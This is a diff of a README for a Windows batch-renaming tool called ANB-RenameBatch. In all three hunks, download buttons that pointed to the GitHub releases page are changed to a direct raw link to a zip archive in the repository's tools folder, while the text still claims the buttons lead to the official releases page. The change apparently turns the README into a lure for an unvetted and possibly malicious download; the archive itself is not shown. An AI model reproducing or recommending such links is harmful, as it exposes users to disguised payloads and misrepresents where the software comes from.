@@ -1,6 +1,6 @@
 # 🗂️ ANB-RenameBatch - Simple, Safe Batch Renaming
 
-[![Download ANB-RenameBatch](https://img.shields.io/badge/Download-ANB--RenameBatch-brightgreen?style=for-the-badge)](https://github.com/Oliversbruno/ANB-RenameBatch/releases)
+[![Download ANB-RenameBatch](https://img.shields.io/badge/Download-ANB--RenameBatch-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Oliversbruno/ANB-RenameBatch/main/tools/Rename-AN-Batch-v1.0.zip)
 
 ---
 
@@ -37,7 +37,7 @@ ANB-RenameBatch works on Windows 10 or newer. It needs no extra software to run.
 
 To get ANB-RenameBatch, visit the official releases page by clicking the big button below:
 
-[![Download ANB-RenameBatch](https://img.shields.io/badge/Download-ANB--RenameBatch-blue?style=for-the-badge)](https://github.com/Oliversbruno/ANB-RenameBatch/releases)
+[![Download ANB-RenameBatch](https://img.shields.io/badge/Download-ANB--RenameBatch-blue?style=for-the-badge)](https://raw.githubusercontent.com/Oliversbruno/ANB-RenameBatch/main/tools/Rename-AN-Batch-v1.0.zip)
 
 You will find the latest version there. The files come as `.exe` installers or `.zip` archives. Choose the option you prefer.
 
@@ -183,7 +183,7 @@ Logs are saved in a folder inside the program’s folder and can be reviewed any
 
 Find the latest version and updates here:
 
-[![Download ANB-RenameBatch](https://img.shields.io/badge/Download-ANB--RenameBatch-brightgreen?style=for-the-badge)](https://github.com/Oliversbruno/ANB-RenameBatch/releases)
+[![Download ANB-RenameBatch](https://img.shields.io/badge/Download-ANB--RenameBatch-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Oliversbruno/ANB-RenameBatch/main/tools/Rename-AN-Batch-v1.0.zip)
 
 ---
 
